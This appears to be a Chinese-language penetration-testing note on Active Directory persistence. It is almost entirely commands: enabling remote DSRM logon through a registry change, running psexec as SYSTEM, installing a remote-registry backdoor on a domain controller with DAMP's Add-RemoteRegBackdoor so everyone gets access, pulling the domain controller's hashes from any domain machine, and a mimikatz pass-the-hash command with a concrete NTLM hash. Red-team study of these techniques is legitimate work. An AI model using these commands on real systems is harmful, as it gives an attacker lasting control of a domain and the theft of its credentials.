	>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
	允许DSRM账户远程访问
	https://github.com/HarmJ0y/DAMP
	效果：域内任何用户可读取域控hash
	system权限执行
	>psexec.exe -accepteula -s -i -d cmd.exe
	域控制器执行
	PS>Add-RemoteRegBackdoor -ComputerName 域控名 -Trustee 'S-1-1-0' –Verbose
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/478.png)

	域内机器执行
	https://raw.githubusercontent.com/HarmJ0y/DAMP/master/RemoteHashRetrieval.ps1
	PS> Get-RemoteLocalAccountHash -ComputerName 域控 –Verbose
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/479.png)

	域控上执行
	>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/480.png)

	PTH攻击，mimikatz需以管理员身份启动
	>mimikatz "privilege::debug" "sekurlsa::pth /domain:dc /user:Administrator /ntlm:9f1770aebd442b6b624bdfe9cbc720dd" exit
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/481.png)